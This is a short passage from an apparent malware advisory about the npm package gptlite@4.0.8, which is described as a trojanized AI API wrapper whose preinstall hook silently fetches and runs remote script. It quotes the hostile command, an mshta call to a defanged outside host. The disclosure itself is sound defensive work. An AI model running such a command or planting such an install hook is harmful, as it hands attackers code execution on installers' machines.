  "summary": "Malicious code in gptlite (npm)",
  "details": "The package gptlite@4.0.8 is a trojanized AI API wrapper. Its preinstall hook (preinstall.js) runs `mshta hxxp://fixars[.]top` on Windows, which fetches and executes arbitrary script from the remote host fixars[.]top. The main module (gptlite.js) appears to be a legitimate GPTMiniClient library, but the install-time hook performs remote code execution without the installer's knowledge or consent.",
